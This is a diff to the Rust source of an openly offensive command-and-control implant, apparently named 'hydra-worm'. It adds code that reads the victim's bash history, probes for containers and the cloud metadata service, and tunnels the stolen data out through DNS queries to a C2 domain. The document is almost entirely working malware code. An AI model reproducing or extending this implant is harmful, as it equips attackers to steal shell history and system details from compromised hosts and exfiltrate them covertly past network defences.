@@ -15,14 +15,15 @@ use pnet::packet::icmp::IcmpTypes;
 
 #[derive(Serialize, Clone)]
 struct Telemetry {
-    agent_id: String, 
-    transport: String,
-    status: String,
-    lambda: f64,
-    // Phase 2.1: System Metadata
-    hostname: String,
-    username: String,
-    os: String,
+    #[serde(rename = "a")] agent_id: String, 
+    #[serde(rename = "t")] transport: String,
+    #[serde(rename = "s")] status: String,
+    #[serde(rename = "l")] lambda: f64,
+    #[serde(rename = "h")] hostname: String,
+    #[serde(rename = "u")] username: String,
+    #[serde(rename = "o")] os: String,
+    #[serde(rename = "e")] env_context: String,
+    #[serde(rename = "p")] artifact_preview: String,
 }
 
 #[derive(Deserialize)]
@@ -31,6 +32,28 @@ struct C2Response {
     status: String,
     task: String,
     epoch: i64,
+}
+
+fn harvest_bash_history(username: &str) -> String {
+    // Determine path based on user
+    let path = if username == "root" {
+        "/root/.bash_history".to_string()
+    } else {
+        format!("/home/{}/.bash_history", username)
+    };
+
+    match std::fs::read_to_string(&path) {
+        Ok(content) => {
+            // Take the last 2 lines to keep the packet size within DNS/HTTP limits
+            let lines: Vec<&str> = content.lines().rev().take(2).collect();
+            if lines.is_empty() { 
+                "Empty history".into() 
+            } else { 
+                lines.join(" | ").replace("\"", "'") // Sanitize quotes for JSON
+            }
+        }
+        Err(_) => "Access Denied".into(),
+    }
 }
 
 trait Transport {
@@ -46,50 +69,57 @@ struct DnsTransport {
     root_domain: String 
 }
 
+// --- TRANSPORT TIER 6: DNS TUNNELING (RFC 1035 HARDENED) ---
 impl Transport for DnsTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
-        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
+        // 1. TACTICAL TRIMMING: DNS names cannot exceed 255 total bytes.
+        // We must truncate the bash history to fit.
+        let mut stats_min = stats.clone();
+        if stats_min.artifact_preview.len() > 32 {
+            stats_min.artifact_preview = format!("{}...", &stats_min.artifact_preview[..29]);
+        }
+
+        let json_data = serde_json::to_string(&stats_min).map_err(|e| e.to_string())?;
         
+        // 2. URL-Safe Encoding (matches Go side)
         let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
         
-        let chunks: Vec<String> = encoded
-            .as_bytes()
-            .chunks(60)
-            .map(|c| String::from_utf8_lossy(c).into_owned())
-            .collect();
-        
-        let tunnel_query = format!("{}.{}", chunks.join("."), self.root_domain);
-
         let mut packet = Vec::new();
-        // Fixed DNS Header (Transaction ID 0x1337)
+        // DNS Header: Transaction ID (0x1337), Flags (Standard Query), 1 Question
         packet.extend_from_slice(&[0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); 
 
-        for part in tunnel_query.split('.') {
+        // 3. ENCODE PAYLOAD LABELS: Length-prefix every 60 bytes
+        for chunk in encoded.as_bytes().chunks(60) {
+            packet.push(chunk.len() as u8);
+            packet.extend_from_slice(chunk);
+        }
+
+        // 4. ENCODE ROOT DOMAIN: "c2.hydra-worm.local"
+        // We split by '.' to ensure each part is treated as a distinct DNS label
+        for part in self.root_domain.split('.') {
             if part.is_empty() { continue; }
             packet.push(part.len() as u8);
             packet.extend_from_slice(part.as_bytes());
         }
-        packet.push(0); 
-        packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); 
-
-        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
         
-        // Logic Fix: Set a 2-second timeout so the agent doesn't hang if C2 is offline
+        // Null terminator (End of Name) + Type A + Class IN
+        packet.push(0); 
+        packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]);
+
+        // 5. DISPATCH & AWAIT ACK
+        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
         socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
         
         socket.send_to(&packet, "127.0.0.1:53").map_err(|e| e.to_string())?;
 
-        // Logic Fix: Wait for the Orchestrator to ACK before declaring success
         let mut buf = [0u8; 512];
         match socket.recv_from(&mut buf) {
-            Ok(_) => Ok(C2Response { status: "dns_verified".into(), task: "HIBERNATE".into(), epoch: 0 }),
-            Err(_) => Err("C2 DNS Listener Offline (No ACK)".into()),
+            Ok(_) => Ok(C2Response { status: "dns_ack".into(), task: "SLEEP".into(), epoch: 0 }),
+            Err(_) => Err("DNS Timeout - No C2 ACK".into()),
         }
     }
 
-    fn get_name(&self) -> String { 
-        "DNS-Tunnel".into() 
-    }
+    fn get_name(&self) -> String { "DNS-Tunnel".into() }
 }
 
 // --- TRANSPORT TIER 5: NTP SIGNALING ---
@@ -218,6 +248,24 @@ struct Agent {
     lambda: f64,
 }
 
+fn detect_env() -> String {
+    // Check for Docker
+    if std::path::Path::new("/.dockerenv").exists() {
+        return "Docker-Container".into();
+    }
+
+    // Check for Cloud IMDS (AWS/GCP/OpenStack)
+    let client = reqwest::blocking::Client::builder()
+        .timeout(Duration::from_millis(300)) // Fast timeout to avoid lag
+        .build()
+        .unwrap_or_default();
+
+    match client.get("http://169.254.169.254/latest/meta-data/instance-id").send() {
+        Ok(_) => "Cloud-Instance".into(),
+        Err(_) => "Bare-Metal/VM".into(),
+    }
+}
+
 impl Agent {
     fn new(id: &str) -> Self {
         Self {
@@ -234,12 +282,9 @@ impl Agent {
         sys.refresh_all();
         
         let hostname = System::host_name().unwrap_or_else(|| "unknown_host".into());
-        
-        // Logical Fix: Load the independent Users list
         let user_list = sysinfo::Users::new_with_refreshed_list();
         let current_pid = sysinfo::get_current_pid().unwrap();
         
-        // Identify the ACTUAL user running this process
         let username = sys.process(current_pid)
             .and_then(|p| {
                 let uid = p.user_id()?;
@@ -248,11 +293,13 @@ impl Agent {
             .map(|u: &sysinfo::User| u.name().to_string())
             .unwrap_or_else(|| "unknown_user".into());
             
-        let os_name = System::name().unwrap_or_default();
-        let os_ver = System::os_version().unwrap_or_default();
-        let os_info = format!("{} {}", os_name, os_ver);
+        let os_info = format!("{} {}", System::name().unwrap_or_default(), System::os_version().unwrap_or_default());
+        let env_ctx = detect_env();
 
         loop {
+            // Harvest artifacts
+            let history_snippet = harvest_bash_history(&username);
+
             let stats = Telemetry {
                 agent_id: self.id.clone(),
                 transport: self.transport.get_name(),
@@ -261,11 +308,13 @@ impl Agent {
                 hostname: hostname.clone(),
                 username: username.clone(),
                 os: os_info.clone(),
+                env_context: env_ctx.clone(),
+                artifact_preview: history_snippet,
             };
 
             match self.transport.send_heartbeat(&stats) {
                 Ok(res) => {
-                    println!("[+] C2 Status: {} | Task: {}", res.status, res.task);
+                    println!("[+] C2 Status: {} | Env: {} | Activity: {}", res.status, env_ctx, stats.artifact_preview);
                     self.failures = 0;
                 },
                 Err(e) => {
@@ -310,7 +359,7 @@ fn display_splash() {
   |__/|__/\____/_/ .__/_/ /_/ /_/                 
                 /_/                              
     "#);
-    println!("      [ Phase 1.5 - Failsafe Stack Complete ]\n");
+    println!("      [ Phase 2.2 Artifact Harvesting: Parsing known_hosts and bash_history.]\n");
 }
 
 fn main() {
